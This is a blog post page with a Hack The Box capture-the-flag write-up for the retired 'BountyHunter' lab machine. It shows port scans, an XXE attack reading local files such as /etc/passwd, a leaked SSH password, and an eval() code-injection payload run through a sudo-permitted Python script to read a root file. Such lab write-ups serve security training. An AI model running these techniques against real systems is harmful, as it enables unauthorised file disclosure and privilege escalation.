@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <title>HTB Write-up | BountyHunter</title>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="stylesheet" type="text/css" href="../assets/built/screen.css%3Fv=fdaa498c6b.css" />
+
+    <link rel="canonical" href="index.html" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+    <link rel="amphtml" href="amp/index.html" />
+    
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="HTB Write-up | BountyHunter" />
+    <meta property="og:description" content="Retired machine can be found here.ScanningLike with most HTB machines, a quick scan only disclosed SSH running on port 22 and a web server running on port 80: ~ nmap 10.10.11.100 PORT   STATE SERVICE 22/tcp open  ssh 80/tcp open  http ~ nmap 10.10.11.100" />
+    <meta property="og:url" content="inesmartins.github.io/htb-write-up-bountyhunter/" />
+    <meta property="og:image" content="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-21.24.06.png" />
+    <meta property="article:published_time" content="2021-11-29T23:14:17.000Z" />
+    <meta property="article:modified_time" content="2021-11-29T23:14:17.000Z" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="HTB Write-up | BountyHunter" />
+    <meta name="twitter:description" content="Retired machine can be found here.ScanningLike with most HTB machines, a quick scan only disclosed SSH running on port 22 and a web server running on port 80: ~ nmap 10.10.11.100 PORT   STATE SERVICE 22/tcp open  ssh 80/tcp open  http ~ nmap 10.10.11.100" />
+    <meta name="twitter:url" content="inesmartins.github.io/htb-write-up-bountyhunter/" />
+    <meta name="twitter:image" content="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-21.24.06.png" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Inês Martins" />
+    <meta property="og:image:width" content="593" />
+    <meta property="og:image:height" content="375" />
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "",
+        "url": "inesmartins.github.io/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "inesmartins.github.io/favicon.ico",
+            "width": 48,
+            "height": 48
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Inês Martins",
+        "image": {
+            "@type": "ImageObject",
+            "url": "inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-21.31.59.png",
+            "width": 592,
+            "height": 572
+        },
+        "url": "inesmartins.github.io/author/ines/",
+        "sameAs": []
+    },
+    "headline": "HTB Write-up | BountyHunter",
+    "url": "inesmartins.github.io/htb-write-up-bountyhunter/",
+    "datePublished": "2021-11-29T23:14:17.000Z",
+    "dateModified": "2021-11-29T23:14:17.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-21.24.06.png",
+        "width": 593,
+        "height": 375
+    },
+    "description": "&gt; Retired machine can be found here\n[https://www.hackthebox.eu/home/machines/profile/359].\nScanning\nLike with most HTB machines, a quick scan only disclosed SSH running on port 22 \nand a web server running on port 80:\n\n~ nmap 10.10.11.100\n\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\n~ nmap 10.10.11.100 -sC -sV -A -p 22,80\n\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)\n|",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "inesmartins.github.io/"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 4.7" />
+    <link rel="alternate" type="application/rss+xml" title="" href="../rss/index.html" />
+    <script defer src="https://unpkg.com/@tryghost/portal@~1.5.1/umd/portal.min.js" data-ghost="inesmartins.github.io/"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
+.gh-post-upgrade-cta {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    text-align: center;
+    width: 100%;
+    color: #ffffff;
+    font-size: 16px;
+}
+
+.gh-post-upgrade-cta-content {
+    border-radius: 8px;
+    padding: 40px 4vw;
+}
+
+.gh-post-upgrade-cta h2 {
+    color: #ffffff;
+    font-size: 28px;
+    letter-spacing: -0.2px;
+    margin: 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta p {
+    margin: 20px 0 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta small {
+    font-size: 16px;
+    letter-spacing: -0.2px;
+}
+
+.gh-post-upgrade-cta a {
+    color: #ffffff;
+    cursor: pointer;
+    font-weight: 500;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a:hover {
+    color: #ffffff;
+    opacity: 0.8;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a.gh-btn {
+    display: block;
+    background: #ffffff;
+    text-decoration: none;
+    margin: 28px 0 0;
+    padding: 8px 18px;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.gh-post-upgrade-cta a.gh-btn:hover {
+    opacity: 0.92;
+}</style>
+    <link rel="icon" type="image/png" href="../content/images/2021/08/Screenshot-2021-08-22-at-21.31.59.png"/>
+<link rel="icon" type="image/png" href="../content/images/2021/08/Screenshot-2021-08-22-at-21.31.59.png"/>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-180659126-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-180659126-1');
+</script>
+<script>
+    window.onload = function(e){ 
+	    var copyrightElement = document.getElementsByClassName('copyright')[0];
+    	copyrightElement.innerHTML = '<p>Inês Martins © 2021</p>'
+        copyrightElement.innerHTML += '<p>Contact: <a href="mailto:inesmartins.github.io@pm.me">inesmartins.github.io@pm.me</a></p>'
+	    copyrightElement.innerHTML += '<p>Banner by Josan Gonzalez aka <a href="https://www.artstation.com/josan">Death Burger</a>'
+        var footerNav = document.getElementsByClassName('site-footer-nav')[0];
+        footerNav.innerHTML = '<img src="http://www.hackthebox.eu/badge/image/172261" alt="Hack The Box">'
+	}
+</script>
+<!-- Styles -->
+<style>
+    .gh-head-actions,
+    .footer-cta, 
+    .gh-head-button {
+        display: none;
+    }
+    .article-image img {
+        max-height: 400px;
+        object-fit: contain;
+    }
+    .site-footer-nav {
+        display: block;
+    }
+    @media (max-width: 800px) {    
+	    .site-footer-nav {
+    	    margin: 20px auto;
+	    }
+    }
+</style><style>:root {--ghost-accent-color: #000000;}</style>
+
+</head>
+<body class="post-template">
+<div class="viewport">
+
+    <header id="gh-head" class="gh-head has-cover">
+        <nav class="gh-head-inner inner gh-container">
+
+            <div class="gh-head-brand">
+                <a class="gh-head-logo" href="../index.html">
+                        
+                </a>
+                <a class="gh-burger" role="button">
+                    <div class="gh-burger-box">
+                        <div class="gh-burger-inner"></div>
+                    </div>
+                </a>
+            </div>
+            <div class="gh-head-menu">
+                <ul class="nav">
+    <li class="nav-home"><a href="../index.html">Home</a></li>
+</ul>
+
+            </div>
+            <div class="gh-head-actions">
+                <div class="gh-social">
+                </div>
+
+                    <a class="gh-head-button" href="index.html#/portal/signup">Subscribe</a>
+            </div>
+        </nav>
+    </header>
+
+    <main>
+        
+
+
+
+<article class="article post">
+
+    <header class="article-header gh-canvas">
+
+
+        <h1 class="article-title">HTB Write-up | BountyHunter</h1>
+
+
+        <div class="article-byline">
+            <section class="article-byline-content">
+                <ul class="author-list">
+                    <li class="author-list-item">
+                        <a href="../author/ines/index.html" class="author-avatar">
+                            <img class="author-profile-image" src="../content/images/size/w100/2021/08/Screenshot-2021-08-22-at-21.31.59.png" alt="Inês Martins" />
+                        </a>
+                    </li>
+                </ul>
+                <div class="article-byline-meta">
+                    <h4 class="author-name"><a href="../author/ines/index.html">Inês Martins</a></h4>
+                    <div class="byline-meta-content">
+                        <time class="byline-meta-date" datetime="2021-11-29">Nov 29, 2021</time>
+                        <span class="byline-reading-time"><span class="bull">&bull;</span> 7 min read</span>
+                    </div>
+                </div>
+            </section>
+        </div>
+
+        <figure class="article-image">
+            <img
+                srcset="../content/images/size/w300/2021/09/Screenshot-2021-09-12-at-21.24.06.png 300w,
+                       ../content/images/size/w600/2021/09/Screenshot-2021-09-12-at-21.24.06.png 600w,
+                      ../content/images/size/w1000/2021/09/Screenshot-2021-09-12-at-21.24.06.png 1000w,
+                     ../content/images/size/w2000/2021/09/Screenshot-2021-09-12-at-21.24.06.png 2000w"
+                sizes="(min-width: 1400px) 1400px, 92vw"
+                src="../content/images/size/w2000/2021/09/Screenshot-2021-09-12-at-21.24.06.png"
+                alt="HTB Write-up | BountyHunter"
+            />
+        </figure>
+    </header>
+
+    <section class="gh-content gh-canvas">
+        <blockquote>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/359">here</a>.</blockquote><h2 id="scanning">Scanning</h2><p>Like with most HTB machines, a quick scan only disclosed <code>SSH</code> running on port <code>22</code> and a web server running on port <code>80</code>:</p><pre><code>~ nmap 10.10.11.100
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+~ nmap 10.10.11.100 -sC -sV -A -p 22,80
+
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
+|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
+|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Bounty Hunters</code></pre><p>The website seems to be the corporate page for "The B Team": they're bounty hunters, security researchers, and can also use Burp ... impressive stuff.</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/09/Screenshot-2021-09-12-at-21.27.46.png" class="kg-image" alt loading="lazy" width="1440" height="732" srcset="../content/images/size/w600/2021/09/Screenshot-2021-09-12-at-21.27.46.png 600w, ../content/images/size/w1000/2021/09/Screenshot-2021-09-12-at-21.27.46.png 1000w, ../content/images/2021/09/Screenshot-2021-09-12-at-21.27.46.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>The "Portal" link sends us to a <code>portal.php</code> page, which itself links to a page that contains "the bounty tracker" - note that the portal itself is "under development":</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/09/Screenshot-2021-09-12-at-21.28.45.png" class="kg-image" alt loading="lazy" width="1440" height="358" srcset="../content/images/size/w600/2021/09/Screenshot-2021-09-12-at-21.28.45.png 600w, ../content/images/size/w1000/2021/09/Screenshot-2021-09-12-at-21.28.45.png 1000w, ../content/images/2021/09/Screenshot-2021-09-12-at-21.28.45.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>The "bounty tracker" aka the "Bounty Report System" is hosted at <code>/log_submit.php</code> and is still in beta:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/09/Screenshot-2021-09-12-at-21.29.09.png" class="kg-image" alt loading="lazy" width="1260" height="281" srcset="../content/images/size/w600/2021/09/Screenshot-2021-09-12-at-21.29.09.png 600w, ../content/images/size/w1000/2021/09/Screenshot-2021-09-12-at-21.29.09.png 1000w, ../content/images/2021/09/Screenshot-2021-09-12-at-21.29.09.png 1260w" sizes="(min-width: 1200px) 1200px"></figure><p>We're also able to navigate the <code>/resources</code> directory, which contains some interesting files:</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/09/Screenshot-2021-09-12-at-21.35.05.png" class="kg-image" alt loading="lazy"></figure><p>The most interesting, at first glance, seems to be this note:</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/09/Screenshot-2021-09-12-at-21.33.58.png" class="kg-image" alt loading="lazy"></figure><p>A lot to unpack here:</p><ul><li>there's a <code>test</code> account on the portal that supports <code>nopass</code>;</li><li>we should probably take a look at the "tracker submit script";</li><li>this script is not yet connected to a DB;</li><li>there's a <code>developer</code> group somewhere, that used to have too many permissions.</li></ul><p>Running <code>nikto</code> we also found a <code>db.php</code> file:</p><pre><code>~ nikto -host 10.10.11.100
+...
+OSVDB-3093: /db.php: This might be interesting... has been seen in web logs from an unknown scanner.</code></pre><p>And indeed, unlike other random (non-existing) files, this one doesn't return <code>404</code>, but also doesn't return any data.</p><hr><h2 id="xxe-to-lfi">XXE to LFI</h2><p>The <code>/resources/bountylog.js</code> file seems to be the aforementioned "tracker submit script". As you can see below, this script:</p><ul><li>takes the values from the form submitted on the <code>log_submit.php</code> page</li><li>builds an <code>XML</code> string</li><li><code>base64</code>-encodes this data</li><li>sends it to <code>/tracker_diRbPr00f314.php</code> via <code>POST</code> request</li></ul><figure class="kg-card kg-image-card"><img src="../content/images/2021/09/Screenshot-2021-09-12-at-21.39.13.png" class="kg-image" alt loading="lazy" width="658" height="452" srcset="../content/images/size/w600/2021/09/Screenshot-2021-09-12-at-21.39.13.png 600w, ../content/images/2021/09/Screenshot-2021-09-12-at-21.39.13.png 658w"></figure><p>In response, this <code>/tracker_diRbPr00f314.php</code> page displays the submitted data, and also an interesting message: "If DB were ready, would have added: [...]" - this lets us know that <strong>the DB is not yet configured</strong>:</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/09/Screenshot-2021-09-12-at-21.40.16.png" class="kg-image" alt loading="lazy" width="599" height="174"></figure><p>Since the data is sent via <code>XML</code> I wanted to see if I could manipulate this payload in a way that achieves <code>LFI</code> using <code>XXE</code>. As always, I created a Python script to help me test ideas out:</p><!--kg-card-begin: html--><script src="https://gist.github.com/inesmartins/582a499b67c4a0c4d7507b0e0cb735de.js"></script><!--kg-card-end: html--><p>Turns out, the application <em>is</em> vulnerable to <code>XXE</code> - as an example we can see the output of the <code>/etc/passwd</code> file:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="../content/images/2021/09/Screenshot-2021-09-18-at-13.22.35.png" class="kg-image" alt loading="lazy"></figure><hr><h2 id="lfi-to-rce">LFI to RCE</h2><p>After running this script with a few different <a href="https://github.com/danielmiessler/SecLists">SecLists</a> (and creating some lists of my own), I was able to get the exact Linux version:</p><pre><code>Linux version 5.4.0-80-generic (buildd@lcy01-amd64-030) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #90-Ubuntu SMP Fri Jul 9 22:49:44 UTC 2021
+</code></pre><p>... as well as the most interesting users:</p><pre><code># /etc/passwd
+...
+root:x:0:0:root:/root:/bin/bash
+development:x:1000:1000:Development:/home/development:/bin/bash
+...</code></pre><p>After changing the script to use <code>php://filter/read=convert.base64-encode/resource=</code> instead of <code>file://</code> for files ending in <code>.php</code>, I also had access to all of the project's files, including the DB:</p><pre><code>~ python3 xxe-script.py -url http://10.10.11.100/tracker_diRbPr00f314.php -pathlist wordlists/custom-finding-webserver-files.txt
+Checking /var/www/html/db.php
+	File contains data!
+Checking /var/www/html/index.php
+	File contains data!
+Checking /var/www/html/portal.php
+	File contains data!
+Checking /var/www/html/log_submit.php
+	File contains data!
+Checking /var/www/html/tracker_diRbPr00f314.php
+	File contains data!
+Checking /var/www/html/resources/README.txt
+	File contains data!
+Checking /var/www/html/resources/lato.css
+	File contains data!
+Checking /var/www/html/resources/monsterat.css
+	File contains data!
+Checking /var/www/html/resources/all.js
+Checking /var/www/html/resources/bootstrap.bundle.min.js
+Checking /var/www/html/resources/bootstrap_login.min.js
+Checking /var/www/html/resources/bountylog.js
+Checking /var/www/html/resources/jquery.easing.min.js
+Checking /var/www/html/resources/jquery.min.js
+Checking /var/www/html/resources/jquery_login.min.js</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2021/09/Screenshot-2021-09-18-at-18.38.19.png" class="kg-image" alt loading="lazy"></figure><p>Luckily for us, someone used the same creds for the DB and <code>SSH</code> access, so I got a shell:</p><pre><code>~ ssh development@10.10.11.100
+&gt; m19RoAU0hP41A1sTsq6K</code></pre><hr><h2 id="r00ting">R00ting</h2><p>Once in the user's <code>/home</code> directory, I could see a message from John to other developers:</p><pre><code>~ ls -la
+lrwxrwxrwx 1 root        root           9 Apr  5 22:53 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 development development  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 development development 3771 Feb 25  2020 .bashrc
+drwx------ 2 development development 4096 Apr  5 22:50 .cache
+lrwxrwxrwx 1 root        root           9 Jul  5 05:46 .lesshst -&gt; /dev/null
+drwxrwxr-x 3 development development 4096 Apr  6 23:34 .local
+-rw-r--r-- 1 development development  807 Feb 25  2020 .profile
+drwx------ 2 development development 4096 Apr  7 01:48 .ssh
+-rw-r--r-- 1 root        root         471 Jun 15 16:10 contract.txt
+-r--r----- 1 root        development   33 Sep 19 06:18 user.txt</code></pre><pre><code>$ cat contract.txt
+Hey team,
+
+I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.
+
+This has been our first job since the "rm -rf" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.
+
+I set up the permissions for you to test this. Good luck.
+
+-- John</code></pre><p>John seems to be referring to some "internal tool" sent by "Skytrain Inc", so I tried to find any other reference to this company. Under <code>/opt</code> I got some interesting matches:</p><pre><code>$ grep -Rils 'Skytrain' /opt
+
+/opt/skytrain_inc/ticketValidator.py
+/opt/skytrain_inc/invalid_tickets/390681613.md
+/opt/skytrain_inc/invalid_tickets/734485704.md
+/opt/skytrain_inc/invalid_tickets/529582686.md
+/opt/skytrain_inc/invalid_tickets/600939065.md</code></pre><p>The <code>ticketValidator.py</code> seems interesting:</p><pre><code>~ ls -la /opt/skytrain_inc/ticketValidator.py
+-r-xr--r-- 1 root root 1471 Jul 22 11:08 /opt/skytrain_inc/ticketValidator.py</code></pre><p>When we run it using some of the tickets in the same directory, we see that these tickets are invalid:</p><pre><code>$ python3 /opt/skytrain_inc/ticketValidator.py
+Please enter the path to the ticket file.
+/opt/skytrain_inc/invalid_tickets/390681613.md
+Destination: New Haven
+Invalid ticket.
+
+$ python3 /opt/skytrain_inc/ticketValidator.py
+Please enter the path to the ticket file.
+/opt/skytrain_inc/invalid_tickets/734485704.md
+Destination: Bridgeport
+Invalid ticket.</code></pre><p>Let's take a closer look at the script to see if we're able to abuse it:</p><pre><code class="language-python">#Skytrain Inc Ticket Validation System 0.1
+#Do not distribute this file.
+
+def load_file(loc):
+    if loc.endswith(".md"):
+        return open(loc, 'r')
+    else:
+        print("Wrong file type.")
+        exit()
+
+def evaluate(ticketFile):
+    #Evaluates a ticket to check for ireggularities.
+    code_line = None
+    for i,x in enumerate(ticketFile.readlines()):
+        if i == 0:
+            if not x.startswith("# Skytrain Inc"):
+                return False
+            continue
+        if i == 1:
+            if not x.startswith("## Ticket to "):
+                return False
+            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
+            continue
+
+        if x.startswith("__Ticket Code:__"):
+            code_line = i+1
+            continue
+
+        if code_line and i == code_line:
+            if not x.startswith("**"):
+                return False
+            ticketCode = x.replace("**", "").split("+")[0]
+            if int(ticketCode) % 7 == 4:
+                validationNumber = eval(x.replace("**", ""))
+                if validationNumber &gt; 100:
+                    return True
+                else:
+                    return False
+    return False
+
+def main():
+    fileName = input("Please enter the path to the ticket file.\n")
+    ticket = load_file(fileName)
+    #DEBUG print(ticket)
+    result = evaluate(ticket)
+    if (result):
+        print("Valid ticket.")
+    else:
+        print("Invalid ticket.")
+    ticket.close
+
+main()
+</code></pre><p>After some local tests I was able to create a valid payload, but I was still unable to get the root flag, due to a "Permission denied" exception:</p><pre><code># Skytrain Inc
+## Ticket to Bridgeport
+__Ticket Code:__
+**18 + __import__('os').system('cat /root/root.txt')**
+##Issued: 2021/06/21
+#End Ticket</code></pre><p>After using <code>linpeas.sh</code> I realised that I was able to execute a very specific command as <code>sudo</code>:</p><pre><code>User development may run the following commands on bountyhunter:
+    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py</code></pre><p>Using this privileged command, I was able to get the flag:</p><pre><code>$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
+Please enter the path to the ticket file.
+/tmp/malicious.md
+Destination: Bridgeport
+c70cb6e9f9e9a923d6718090a3f74d33
+Invalid ticket.</code></pre><hr><h2 id="references">References</h2><ul><li><a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing</a></li><li><a href="https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2">https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2</a></li><li><a href="https://resources.infosecinstitute.com/topic/local-file-inclusion-code-execution/">https://resources.infosecinstitute.com/topic/local-file-inclusion-code-execution/</a></li></ul>
+    </section>
+
+
+</article>
+
+<section class="footer-cta">
+    <div class="inner">
+        <h2>Sign up for more like this.</h2>
+        <a class="footer-cta-button" href="index.html#/portal">
+            <div>Enter your email</div>
+            <span>Subscribe</span>
+        </a>
+    </div>
+</section>
+
+
+<aside class="read-more-wrap">
+    <div class="read-more inner">
+
+
+                    
+<article class="post-card post ">
+
+    <a class="post-card-image-link" href="../htb-write-up-explore/index.html">
+        <img class="post-card-image"
+            srcset="../content/images/size/w300/2021/08/Screenshot-2021-08-01-at-15.59.58.png 300w,
+                   ../content/images/size/w600/2021/08/Screenshot-2021-08-01-at-15.59.58.png 600w,
+                  ../content/images/size/w1000/2021/08/Screenshot-2021-08-01-at-15.59.58.png 1000w,
+                 ../content/images/size/w2000/2021/08/Screenshot-2021-08-01-at-15.59.58.png 2000w"
+            sizes="(max-width: 1000px) 400px, 800px"
+            src="../content/images/size/w600/2021/08/Screenshot-2021-08-01-at-15.59.58.png"
+            alt="HTB Write-up | Explore"
+            loading="lazy"
+        />
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="../htb-write-up-explore/index.html">
+            <header class="post-card-header">
+                <h2 class="post-card-title">HTB Write-up | Explore</h2>
+            </header>
+            <section class="post-card-excerpt">
+                <p>Retired machine can be found here.esketitLet's start with some basic scanning: ~ nmap -A 10.10.10.247 PORT     STATE    SERVICE    VERSION 2222/tcp open     ssh     (protocol 2.0) | fingerprint-strings:  |   NULL:  |_    SSH-2.0-SSH Server - Banana Studio | ssh-hostkey:  |_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:</p>
+            </section>
+        </a>
+
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+                    <a href="../author/ines/index.html" class="static-avatar">
+                        <img class="author-profile-image" src="../content/images/size/w100/2021/08/Screenshot-2021-08-22-at-21.31.59.png" alt="Inês Martins" />
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span><a href="../author/ines/index.html">Inês Martins</a></span>
+                <span class="post-card-byline-date"><time datetime="2021-10-30">Oct 30, 2021</time> <span class="bull">&bull;</span> 3 min read</span>
+            </div>
+        </footer>
+
+    </div>
+
+</article>
+                    
+<article class="post-card post ">
+
+    <a class="post-card-image-link" href="../exploiting-deep-links-in-android-pat-5-testing/index.html">
+        <img class="post-card-image"
+            srcset="../content/images/size/w300/2021/10/maxresdefault-1-1.jpeg 300w,
+                   ../content/images/size/w600/2021/10/maxresdefault-1-1.jpeg 600w,
+                  ../content/images/size/w1000/2021/10/maxresdefault-1-1.jpeg 1000w,
+                 ../content/images/size/w2000/2021/10/maxresdefault-1-1.jpeg 2000w"
+            sizes="(max-width: 1000px) 400px, 800px"
+            src="../content/images/size/w600/2021/10/maxresdefault-1-1.jpeg"
+            alt="Exploiting Deep Links in Android - Part 5 (Testing)"
+            loading="lazy"
+        />
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="../exploiting-deep-links-in-android-pat-5-testing/index.html">
+            <header class="post-card-header">
+                <h2 class="post-card-title">Exploiting Deep Links in Android - Part 5 (Testing)</h2>
+            </header>
+            <section class="post-card-excerpt">
+                <p>EnumerationEnumeration should always start with the App Manifest, which can be extracted from any .apk with a tool such as apktool, e.g.: ~ apktool d com.twitter.android_2021-10-22.apk  I: Using Apktool 2.5.0 on com.twitter.android_2021-10-22.apk I: Loading resource table... I: Decoding AndroidManifest.xml</p>
+            </section>
+        </a>
+
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+                    <a href="../author/ines/index.html" class="static-avatar">
+                        <img class="author-profile-image" src="../content/images/size/w100/2021/08/Screenshot-2021-08-22-at-21.31.59.png" alt="Inês Martins" />
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span><a href="../author/ines/index.html">Inês Martins</a></span>
+                <span class="post-card-byline-date"><time datetime="2021-10-30">Oct 30, 2021</time> <span class="bull">&bull;</span> 4 min read</span>
+            </div>
+        </footer>
+
+    </div>
+
+</article>
+                    
+<article class="post-card post ">
+
+    <a class="post-card-image-link" href="../htb-write-up-monitors/index.html">
+        <img class="post-card-image"
+            srcset="../content/images/size/w300/2021/09/Screenshot-2021-09-12-at-17.10.05.png 300w,
+                   ../content/images/size/w600/2021/09/Screenshot-2021-09-12-at-17.10.05.png 600w,
+                  ../content/images/size/w1000/2021/09/Screenshot-2021-09-12-at-17.10.05.png 1000w,
+                 ../content/images/size/w2000/2021/09/Screenshot-2021-09-12-at-17.10.05.png 2000w"
+            sizes="(max-width: 1000px) 400px, 800px"
+            src="../content/images/size/w600/2021/09/Screenshot-2021-09-12-at-17.10.05.png"
+            alt="HTB Write-up | Monitors"
+            loading="lazy"
+        />
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="../htb-write-up-monitors/index.html">
+            <header class="post-card-header">
+                <h2 class="post-card-title">HTB Write-up | Monitors</h2>
+            </header>
+            <section class="post-card-excerpt">
+                <p>Retired machine can be found here.ScanningLet's start the same as always, with a basic nmap scan: ~ nmap -sC -sV -A 10.10.10.238 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-01 11:15 WEST Nmap scan report for 10.10.10.238 Host is up (0.32s</p>
+            </section>
+        </a>
+
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+                    <a href="../author/ines/index.html" class="static-avatar">
+                        <img class="author-profile-image" src="../content/images/size/w100/2021/08/Screenshot-2021-08-22-at-21.31.59.png" alt="Inês Martins" />
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span><a href="../author/ines/index.html">Inês Martins</a></span>
+                <span class="post-card-byline-date"><time datetime="2021-10-09">Oct 9, 2021</time> <span class="bull">&bull;</span> 9 min read</span>
+            </div>
+        </footer>
+
+    </div>
+
+</article>
+
+    </div>
+</aside>
+
+
+    </main>
+
+    <footer class="site-footer outer">
+        <div class="inner">
+            <section class="copyright"><a href="../index.html"></a> &copy; 2021</section>
+            <nav class="site-footer-nav">
+                
+            </nav>
+            <div><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
+        </div>
+    </footer>
+
+</div>
+
+
+<script
+    src="https://code.jquery.com/jquery-3.5.1.min.js"
+    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
+    crossorigin="anonymous">
+</script>
+<script src="../assets/built/casper.js%3Fv=fdaa498c6b"></script>
+<script>
+$(document).ready(function () {
+    // Mobile Menu Trigger
+    $('.gh-burger').click(function () {
+        $('body').toggleClass('gh-head-open');
+    });
+    // FitVids - Makes video embeds responsive
+    $(".gh-content").fitVids();
+});
+</script>
+
+
+
+</body>
+</html>
